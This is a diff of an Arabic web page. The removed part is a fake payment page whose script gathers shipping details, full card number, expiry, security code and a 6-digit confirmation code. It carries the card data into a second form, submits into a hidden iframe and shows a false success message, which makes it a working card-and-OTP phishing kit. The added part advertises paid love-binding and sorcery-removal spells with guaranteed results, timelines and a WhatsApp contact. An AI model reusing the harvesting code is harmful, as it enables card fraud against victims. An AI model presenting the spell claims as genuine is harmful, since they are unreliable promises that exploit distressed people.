-                                <input type="text" maxlength="1" class="code-digit" data-index="5">
-                            </div>
-                            
-                            <!-- حقل مخفي للكود الكامل -->
-                            <input type="hidden" name="confirmation_code" id="fullCode">
-                        </div>
-
-                        <!-- معلومات الأمان -->
-                        <div class="quantum-glass p-8 rounded-3xl">
-                            <div class="flex items-center justify-center gap-6 mb-6">
-                                <div class="w-12 h-12 bg-gradient-to-br from-neon-green to-electric-lime rounded-full flex items-center justify-center">
-                                    <i class="fas fa-shield text-black text-lg"></i>
-                                </div>
-                                <span class="text-lg font-bold text-neon-green">حماية كوانتية متطورة</span>
-                            </div>
-                            <p class="text-sm text-gray-300 leading-relaxed">
-                                كودك محمي بتقنيات التشفير الكوانتي المتطورة والأمان العالي
-                            </p>
-                        </div>
-
-                        <!-- زر التأكيد -->
-                        <div class="text-center">
-                            <button type="submit" class="w-full quantum-button py-8 rounded-3xl text-2xl font-black relative overflow-hidden" id="submitBtn" disabled="">
-                                <span class="relative z-10 flex items-center justify-center">
-                                    <i class="fas fa-check mr-4 text-3xl"></i>
-                                    إتمام المعاملة
-                                    <i class="fas fa-check ml-4 text-3xl"></i>
-                                </span>
-                            </button>
-                        </div>
-                        
-                        <!-- روابط المساعدة -->
-                        <div class="flex justify-center gap-8 text-lg">
-                            <button type="button" class="text-neon-cyan hover:text-neon-pink transition-colors flex items-center gap-3">
-                                <i class="fas fa-redo text-sm"></i>
-                                إعادة الإرسال
-                            </button>
-                            <button type="button" class="text-neon-green hover:text-neon-orange transition-colors flex items-center gap-3">
-                                <i class="fas fa-headset text-sm"></i>
-                                دعم فوري
-                            </button>
-                        </div>
-                    </form>
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">
+                    <span>كم المدة المطلوبة لظهور النتائج؟</span>
+                    <span class="faq-toggle">+</span>
+                </div>
+                <div class="faq-answer">
+                    حسب نوع العمل: جلب الحبيب (24-72 ساعة)، فك السحر (3-7 أيام)، المشاكل الزوجية (أسبوع)، زواج العوانس (شهر إلى 3 أشهر).
                 </div>
             </div>
-        </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">
+                    <span>هل يمكن الدفع بعد ظهور النتائج؟</span>
+                    <span class="faq-toggle">+</span>
+                </div>
+                <div class="faq-answer">
+                    نعم، نحن من الروحانيين القلائل الذين يقبلون الدفع بعد نجاح العمل ثقة منا في قدرة الله وصدق نيتنا.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">
+                    <span>هل تحتاجون معلومات شخصية؟</span>
+                    <span class="faq-toggle">+</span>
+                </div>
+                <div class="faq-answer">
+                    نحتاج فقط الاسم واسم الأم للشخص المطلوب، ونضمن السرية التامة لجميع المعلومات.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">
+                    <span>ماذا لو لم تنجح الخدمة؟</span>
+                    <span class="faq-toggle">+</span>
+                </div>
+                <div class="faq-answer">
+                    نضمن نجاح العمل بإذن الله، وفي الحالات النادرة جداً نعيد المبلغ كاملاً أو نكرر العمل مجاناً.
+                </div>
+            </div>
+        </section>
     </div>
 
-    <!-- شاشة التحميل -->
-    <div id="loadingOverlay" class="fixed inset-0 bg-black/95 backdrop-blur-lg flex items-center justify-center z-50 hidden">
-        <div class="text-center">
-            <div class="quantum-loader mx-auto mb-12"></div>
-            <div class="quantum-glass p-12 rounded-3xl max-w-lg">
-                <h3 class="text-3xl font-black hologram-text mb-6">معالجة...</h3>
-                <p class="text-xl text-neon-cyan mb-8">تأمين وتشفير البيانات</p>
-                <div class="w-full bg-white/10 rounded-full h-3 overflow-hidden">
-                    <div class="bg-gradient-to-r from-neon-cyan to-neon-green h-full rounded-full" style="width: 85%"></div>
-                </div>
-            </div>
-        </div>
+    <!-- شريط التواصل -->
+    <div class="contact-bar" id="contact">
+        <a href="https://wa.me/966543624058" class="whatsapp-btn">
+            💬 واتساب - استشارة مجانية
+        </a>
+        <a href="tel:+966543624058" class="phone-btn">
+            📞 اتصال مباشر - 24/7
+        </a>
     </div>
-
-    <!-- iframe مخفي لإرسال النماذج بدون توجيه -->
-    <iframe name="hiddenFrame" style="display: none;"></iframe>
 
     <script>
-        // تهيئة الصفحة
-        document.addEventListener('DOMContentLoaded', function() {
-            initQuantumParticles();
-            setupCodeInputs();
-            initFormHandlers();
-            checkForCodePage();
-            checkForBackToMain();
-            
-            window.addEventListener('hashchange', function() {
-                checkForCodePage();
-                checkForBackToMain();
-            });
-        });
-
-        // نظام الجزيئات المحسن
-        function initQuantumParticles() {
-            particlesJS('particles-bg', {
-                particles: {
-                    number: { 
-                        value: 80, 
-                        density: { enable: true, value_area: 800 } 
-                    },
-                    color: { 
-                        value: ['#00FFFF', '#FF0080', '#00FF88'] 
-                    },
-                    shape: {
-                        type: 'circle'
-                    },
-                    opacity: {
-                        value: 0.3,
-                        random: true,
-                        anim: { enable: true, speed: 1, opacity_min: 0.1, sync: false }
-                    },
-                    size: {
-                        value: 3,
-                        random: true,
-                        anim: { enable: true, speed: 20, size_min: 0.1, sync: false }
-                    },
-                    line_linked: {
-                        enable: true,
-                        distance: 150,
-                        color: '#00FFFF',
-                        opacity: 0.2,
-                        width: 1
-                    },
-                    move: {
-                        enable: true,
-                        speed: 1,
-                        direction: 'none',
-                        random: true,
-                        straight: false,
-                        out_mode: 'out',
-                        bounce: false
-                    }
-                },
-                interactivity: {
-                    detect_on: 'canvas',
-                    events: {
-                        onhover: { enable: true, mode: 'repulse' },
-                        onclick: { enable: true, mode: 'push' },
-                        resize: true
-                    },
-                    modes: {
-                        repulse: { distance: 100, duration: 0.4 },
-                        push: { particles_nb: 4 }
-                    }
-                },
-                retina_detect: true
-            });
-        }
-
-        // إعداد حقول الكود
-        function setupCodeInputs() {
-            const codeInputs = document.querySelectorAll('.code-digit');
-            const submitBtn = document.getElementById('submitBtn');
-            
-            codeInputs.forEach((input, index) => {
-                input.addEventListener('input', function(e) {
-                    const value = this.value.replace(/[^0-9]/g, '');
-                    this.value = value;
-                    
-                    if (value) {
-                        this.classList.add('filled');
-                        if (index < codeInputs.length - 1) {
-                            codeInputs[index + 1].focus();
-                        }
-                    } else {
-                        this.classList.remove('filled');
-                    }
-                    
-                    updateFullCode();
-                });
+        // إنشاء النجوم المحسّنة
+        function createStars() {
+            const bg = document.getElementById('cosmicBg');
+            for (let i = 0; i < 300; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
                 
-                input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace' && !this.value && index > 0) {
-                        codeInputs[index - 1].focus();
-                        codeInputs[index - 1].value = '';
-                        codeInputs[index - 1].classList.remove('filled');
-                        updateFullCode();
-                    }
-                });
-            });
-            
-            function updateFullCode() {
-                const fullCode = Array.from(codeInputs).map(input => input.value).join('');
-                document.getElementById('fullCode').value = fullCode;
-                
-                if (fullCode.length === 6) {
-                    submitBtn.disabled = false;
-                    submitBtn.classList.remove('opacity-50');
+                // أنواع مختلفة من النجوم
+                if (Math.random() > 0.9) {
+                    star.classList.add('big');
+                    star.style.width = '4px';
+                    star.style.height = '4px';
+                } else if (Math.random() > 0.8) {
+                    star.classList.add('colored');
+                    star.style.width = '3px';
+                    star.style.height = '3px';
                 } else {
-                    submitBtn.disabled = true;
-                    submitBtn.classList.add('opacity-50');
+                    star.style.width = Math.random() * 2 + 1 + 'px';
+                    star.style.height = star.style.width;
                 }
+                
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.animationDelay = Math.random() * 3 + 's';
+                star.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                bg.appendChild(star);
             }
         }
 
-        // متغير عام لحفظ بيانات النموذج الأول
-        let savedFormData = {};
+        // إنشاء الكويكبات
+        function createAsteroids() {
+            const bg = document.getElementById('cosmicBg');
+            for (let i = 0; i < 3; i++) {
+                const asteroid = document.createElement('div');
+                asteroid.className = 'asteroid';
+                asteroid.style.width = Math.random() * 20 + 10 + 'px';
+                asteroid.style.height = asteroid.style.width;
+                asteroid.style.top = Math.random() * 50 + 25 + '%';
+                asteroid.style.animationDelay = Math.random() * 20 + 's';
+                asteroid.style.animationDuration = (Math.random() * 15 + 20) + 's';
+                bg.appendChild(asteroid);
+            }
+        }
 
-        // إعداد معالجات النماذج
-        function initFormHandlers() {
-            // تنسيق رقم البطاقة
-            document.getElementById('cardNumber').addEventListener('input', function() {
-                let value = this.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
-                let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
-                this.value = formattedValue;
-            });
-
-            // تنسيق حقول التاريخ
-            document.getElementById('expiryMonth').addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '');
-                if (this.value.length === 1 && parseInt(this.value) > 1) {
-                    this.value = '0' + this.value;
-                }
-                if (parseInt(this.value) > 12) {
-                    this.value = '12';
-                }
-            });
-
-            document.getElementById('expiryYear').addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '');
-            });
-
-            // إرسال نموذج البطاقة
-            document.getElementById('cardForm').addEventListener('submit', function(e) {
-                // التأكد من ملء جميع الحقول المطلوبة
-                const requiredFields = [
-                    { id: 'firstName', name: 'الاسم الأول' },
-                    { id: 'lastName', name: 'اسم العائلة' },
-                    { id: 'phoneNumber', name: 'رقم الهاتف' },
-                    { id: 'email', name: 'البريد الإلكتروني' },
-                    { id: 'country', name: 'الدولة' },
-                    { id: 'city', name: 'المحافظة' },
-                    { id: 'address', name: 'العنوان' },
-                    { id: 'shippingCompany', name: 'شركة الشحن' },
-                    { id: 'cardNumber', name: 'رقم البطاقة' },
-                    { id: 'expiryMonth', name: 'شهر الانتهاء' },
-                    { id: 'expiryYear', name: 'سنة الانتهاء' },
-                    { id: 'cardHolder', name: 'اسم حامل البطاقة' }
-                ];
-
-                for (let field of requiredFields) {
-                    const element = document.getElementById(field.id);
-                    if (!element.value.trim()) {
-                        e.preventDefault();
-                        showQuantumAlert('خطأ', `يرجى ملء حقل ${field.name}`);
-                        element.focus();
-                        return;
-                    }
-                }
-
-                const cscField = document.querySelector('input[name="cc-csc"]');
-                if (!cscField.value.trim()) {
-                    e.preventDefault();
-                    showQuantumAlert('خطأ', 'يرجى ملء رمز الأمان');
-                    cscField.focus();
-                    return;
-                }
-
-                showQuantumLoading();
+        // إنشاء الشهب المحسّنة
+        function createShootingStars() {
+            setInterval(() => {
+                if (Math.random() > 0.4) return;
                 
-                // حفظ جميع البيانات
-                savedFormData = {
-                    'shipping_first_name': document.getElementById('firstName').value,
-                    'shipping_last_name': document.getElementById('lastName').value,
-                    'shipping_phone': document.getElementById('phoneNumber').value,
-                    'shipping_email': document.getElementById('email').value,
-                    'shipping_country': document.getElementById('country').value,
-                    'shipping_city': document.getElementById('city').value,
-                    'shipping_address': document.getElementById('address').value,
-                    'shipping_company': document.getElementById('shippingCompany').value,
-                    'cc_number': document.getElementById('cardNumber').value,
-                    'cc_exp_month': document.getElementById('expiryMonth').value,
-                    'cc_exp_year': document.getElementById('expiryYear').value,
-                    'cc_csc': document.querySelector('input[name="cc-csc"]').value,
-                    'cc_name': document.getElementById('cardHolder').value
-                };
-
-                console.log('تم حفظ البيانات:', savedFormData);
-
-                // إضافة البيانات للنموذج الحالي
-                Object.keys(savedFormData).forEach(key => {
-                    // إزالة الحقل إذا كان موجوداً مسبقاً
-                    const existingInput = this.querySelector(`input[name="${key}"]`);
-                    if (existingInput && existingInput.type === 'hidden') {
-                        existingInput.remove();
-                    }
-                    
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = key;
-                    input.value = savedFormData[key];
-                    this.appendChild(input);
-                });
-
-                // الانتقال لصفحة الكود بعد 2 ثانية
+                const star = document.createElement('div');
+                star.className = 'shooting-star';
+                star.style.top = Math.random() * 40 + '%';
+                star.style.left = '-200px';
+                star.style.opacity = 0.8;
+                star.style.transform = `rotate(${Math.random() * 20 - 10}deg)`;
+                star.style.animationDuration = (Math.random() * 2 + 3) + 's';
+                document.getElementById('cosmicBg').appendChild(star);
+                
                 setTimeout(() => {
-                    document.getElementById('loadingOverlay').classList.add('hidden');
-                    showCodePage();
-                }, 2000);
-            });
+                    if (star.parentNode) star.remove();
+                }, 4000);
+            }, 3000);
+        }
 
-            // إرسال نموذج التأكيد
-            document.getElementById('confirmationForm').addEventListener('submit', function(e) {
-                const confirmCode = document.getElementById('fullCode').value;
+        // تبديل الأسئلة الشائعة
+        function toggleFaq(element) {
+            const answer = element.nextElementSibling;
+            const toggle = element.querySelector('.faq-toggle');
+            
+            answer.classList.toggle('active');
+            toggle.classList.toggle('active');
+            toggle.textContent = toggle.classList.contains('active') ? '−' : '+';
+        }
+
+        // تغيير الألوان التلقائي المحسّن
+        const colorSchemes = [
+            {
+                main: '#6a1b9a',
+                secondary: '#9c27b0',
+                accent: '#ff6b6b',
+                gold: '#ffd700'
+            },
+            {
+                main: '#2c3e50',
+                secondary: '#3498db',
+                accent: '#e74c3c',
+                gold: '#f39c12'
+            },
+            {
+                main: '#8e44ad',
+                secondary: '#9b59b6',
+                accent: '#1abc9c',
+                gold: '#f1c40f'
+            },
+            {
+                main: '#34495e',
+                secondary: '#2ecc71',
+                accent: '#e67e22',
+                gold: '#f39c12'
+            }
+        ];
+        
+        let currentScheme = 0;
+        
+        function changeColorScheme() {
+            currentScheme = (currentScheme + 1) % colorSchemes.length;
+            const scheme = colorSchemes[currentScheme];
+            
+            document.documentElement.style.setProperty('--main-color', scheme.main);
+            document.documentElement.style.setProperty('--secondary-color', scheme.secondary);
+            document.documentElement.style.setProperty('--accent-color', scheme.accent);
+            document.documentElement.style.setProperty('--gold-color', scheme.gold);
+        }
+
+        // تشغيل الرسوم المتحركة عند التمرير
+        function animateOnScroll() {
+            const cards = document.querySelectorAll('.service-card, .testimonial-card, .stat-card');
+            
+            cards.forEach(card => {
+                const rect = card.getBoundingClientRect();
+                const isVisible = rect.top < window.innerHeight && rect.bottom > 0;
                 
-                if (!confirmCode || confirmCode.length < 6) {
-                    e.preventDefault();
-                    showQuantumAlert('خطأ', 'يرجى إدخال كود التأكيد المكون من 6 أرقام');
-                    return;
+                if (isVisible) {
+                    card.style.animation = 'slideInUp 0.6s ease-out';
                 }
-                
-                // التأكد من وجود البيانات المحفوظة
-                if (!savedFormData || Object.keys(savedFormData).length === 0) {
-                    e.preventDefault();
-                    showQuantumAlert('خطأ', 'حدث خطأ في البيانات، يرجى المحاولة مرة أخرى');
-                    returnToMainPage();
-                    return;
-                }
-                
-                console.log('إضافة البيانات المحفوظة لنموذج التأكيد:', savedFormData);
-                
-                // إضافة جميع البيانات السابقة إلى نموذج التأكيد
-                Object.keys(savedFormData).forEach(key => {
-                    // إزالة الحقل إذا كان موجوداً مسبقاً
-                    const existingInput = this.querySelector(`input[name="${key}"]`);
-                    if (existingInput && existingInput.type === 'hidden') {
-                        existingInput.remove();
-                    }
-                    
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = key;
-                    input.value = savedFormData[key];
-                    this.appendChild(input);
-                });
-                
-                // إضافة معرف للتمييز بين النماذج
-                const formTypeInput = document.createElement('input');
-                formTypeInput.type = 'hidden';
-                formTypeInput.name = 'form_type';
-                formTypeInput.value = 'confirmation_code_form';
-                this.appendChild(formTypeInput);
-                
-                showQuantumLoading();
-                
-                // عرض رسالة نجاح بعد الإرسال
-                setTimeout(() => {
-                    document.getElementById('loadingOverlay').classList.add('hidden');
-                    showSuccessMessage();
-                    // مسح البيانات المحفوظة بعد الإرسال الناجح
-                    savedFormData = {};
-                }, 2000);
             });
         }
 
-        // بيانات المحافظات
-        const citiesData = {
-            'السعودية': ['الرياض', 'جدة', 'مكة المكرمة', 'المدينة المنورة', 'القصيم', 'الشرقية', 'عسير', 'تبوك', 'حائل', 'الحدود الشمالية', 'جازان', 'نجران', 'الباحة', 'الجوف'],
-            'الكويت': ['العاصمة', 'الأحمدي', 'الجهراء', 'حولي', 'الفروانية', 'مبارك الكبير'],
-            'البحرين': ['العاصمة', 'المحرق', 'الشمالية', 'الجنوبية'],
-            'قطر': ['الدوحة', 'الريان', 'الوكرة', 'الشمال', 'أم صلال', 'الظعاين', 'الخور والذخيرة', 'الشحانية'],
-            'الإمارات': ['أبوظبي', 'دبي', 'الشارقة', 'عجمان', 'أم القيوين', 'رأس الخيمة', 'الفجيرة'],
-            'عُمان': ['مسقط', 'مسندم', 'البريمي', 'الظاهرة', 'الداخلية', 'شمال الباطنة', 'جنوب الباطنة', 'شمال الشرقية', 'جنوب الشرقية', 'الوسطى', 'ظفار']
-        };
+        // تأثير الكتابة المتحركة للعنوان
+        function typeWriter() {
+            const title = document.querySelector('.main-title');
+            const text = title.textContent;
+            title.textContent = '';
+            
+            let i = 0;
+            const timer = setInterval(() => {
+                title.textContent += text.charAt(i);
+                i++;
+                if (i >= text.length) {
+                    clearInterval(timer);
+                }
+            }, 100);
+        }
 
-        // تحديث المحافظات
-        document.getElementById('country').addEventListener('change', function() {
-            const selectedCountry = this.value;
-            const citySelect = document.getElementById('city');
-            
-            // تحسين تصميم قائمة المحافظات
-            citySelect.className = 'w-full px-6 py-4 quantum-input rounded-xl text-lg font-bold relative z-10';
-            citySelect.style.fontWeight = '900';
-            citySelect.style.color = '#00FFFF';
-            
-            citySelect.innerHTML = '<option value="" style="font-weight: 900; color: #666;">اختر محافظة</option>';
-            
-            if (selectedCountry && citiesData[selectedCountry]) {
-                citySelect.disabled = false;
-                
-                citiesData[selectedCountry].forEach(city => {
-                    const option = document.createElement('option');
-                    option.value = city;
-                    option.textContent = city;
-                    option.style.fontWeight = '900';
-                    option.style.color = '#00FFFF';
-                    citySelect.appendChild(option);
-                });
-            } else {
-                citySelect.disabled = true;
+        // إضافة تأثيرات CSS للرسوم المتحركة
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideInUp {
+                0% { transform: translateY(50px); opacity: 0; }
+                100% { transform: translateY(0); opacity: 1; }
             }
+        `;
+        document.head.appendChild(style);
+
+        // بدء التشغيل
+        window.addEventListener('load', () => {
+            createStars();
+            createAsteroids();
+            createShootingStars();
+            setTimeout(typeWriter, 1000);
         });
 
-        // التحميل
-        function showQuantumLoading() {
-            document.getElementById('loadingOverlay').classList.remove('hidden');
-        }
+        // مراقبة التمرير
+        window.addEventListener('scroll', animateOnScroll);
 
-        // التنبيه
-        function showQuantumAlert(title, message) {
-            const alertHTML = `
-                <div class="fixed inset-0 bg-black/90 backdrop-blur-lg flex items-center justify-center z-50" id="alertModal">
-                    <div class="quantum-glass p-8 rounded-3xl max-w-md w-full mx-4">
-                        <div class="text-center mb-6">
-                            <div class="w-20 h-20 mx-auto bg-gradient-to-br from-neon-pink to-neon-purple rounded-full flex items-center justify-center mb-6">
-                                <i class="fas fa-exclamation-triangle text-3xl text-white"></i>
-                            </div>
-                            <h3 class="text-2xl font-black hologram-text mb-4">${title}</h3>
-                            <p class="text-neon-cyan text-lg">${message}</p>
-                        </div>
-                        <button onclick="document.getElementById('alertModal').remove()" 
-                                class="w-full quantum-button py-4 rounded-2xl font-bold text-lg">
-                            موافق
-                        </button>
-                    </div>
-                </div>
-            `;
-            
-            document.body.insertAdjacentHTML('beforeend', alertHTML);
-        }
+        // تغيير الألوان كل 20 ثانية
+        setInterval(changeColorScheme, 20000);
 
-        // وظائف التنقل
-        function setNextUrl() {
-            const currentUrl = window.location.href;
-            const baseUrl = currentUrl.split('#')[0];
-            document.getElementById('nextUrl').value = baseUrl + '#code-verification';
-        }
-
-        function setCodeNextUrl() {
-            const currentUrl = window.location.href;
-            const baseUrl = currentUrl.split('#')[0];
-            document.getElementById('nextUrlCode').value = baseUrl + '#back-to-main';
-        }
-
-        function checkForCodePage() {
-            if (window.location.hash === '#code-verification') {
-                document.getElementById('page1').classList.add('hidden');
-                document.getElementById('page2').classList.remove('hidden');
-            }
-        }
-
-        function checkForBackToMain() {
-            if (window.location.hash === '#back-to-main') {
+        // تأثير البرق عند النقر على الأزرار
+        document.querySelectorAll('.cta-btn, .whatsapp-btn, .phone-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                this.style.animation = 'pulse 0.3s';
                 setTimeout(() => {
-                    returnToMainPage();
-                }, 500);
-            }
-        }
+                    this.style.animation = '';
+                }, 300);
+            });
+        });
 
-        function returnToMainPage() {
-            document.getElementById('page2').classList.add('hidden');
-            document.getElementById('page1').classList.remove('hidden');
+        // تأثير الجاذبية للماوس
+        document.addEventListener('mousemove', function(e) {
+            const stars = document.querySelectorAll('.star');
+            const mouseX = e.clientX / window.innerWidth;
+            const mouseY = e.clientY / window.innerHeight;
             
-            document.getElementById('cardForm').reset();
-            
-            if (window.location.hash) {
-                history.replaceState('', document.title, window.location.pathname);
-            }
-        }
-
-        // عرض صفحة الكود
-        function showCodePage() {
-            document.getElementById('page1').classList.add('hidden');
-            document.getElementById('page2').classList.remove('hidden');
-        }
-
-        // عرض رسالة النجاح
-        function showSuccessMessage() {
-            const successHTML = `
-                <div class="fixed inset-0 bg-black/95 backdrop-blur-lg flex items-center justify-center z-50" id="successModal">
-                    <div class="quantum-glass p-12 rounded-3xl max-w-lg w-full mx-4 text-center">
-                        <div class="w-24 h-24 mx-auto bg-gradient-to-br from-neon-green to-electric-lime rounded-full flex items-center justify-center mb-8">
-                            <i class="fas fa-check text-4xl text-black"></i>
-                        </div>
-                        <h3 class="text-3xl font-black hologram-text mb-6">تم بنجاح!</h3>
-                        <p class="text-xl text-neon-green mb-8">تمت عملية الدفع بنجاح وسيتم التواصل معك قريباً</p>
-                        <button onclick="location.reload()" 
-                                class="quantum-button py-4 px-8 rounded-2xl font-bold text-lg">
-                            العودة للرئيسية
-                        </button>
-                    </div>
-                </div>
-            `;
-            
-            document.body.insertAdjacentHTML('beforeend', successHTML);
-        }
+            stars.forEach((star, index) => {
+                if (index % 10 === 0) { // تطبيق التأثير على بعض النجوم فقط
+                    const rect = star.getBoundingClientRect();
+                    const starX = rect.left / window.innerWidth;
+                    const starY = rect.top / window.innerHeight;
+                    
+                    const distance = Math.sqrt(Math.pow(mouseX - starX, 2) + Math.pow(mouseY - starY, 2));
+                    
+                    if (distance < 0.1) {
+                        star.style.transform = `scale(${1.5 - distance * 5})`;
+                        star.style.opacity = Math.max(0.3, 1 - distance * 2);
+                    } else {
+                        star.style.transform = 'scale(1)';
+                        star.style.opacity = '';
+                    }
+                }
+            });
+        });
     </script>
 
 
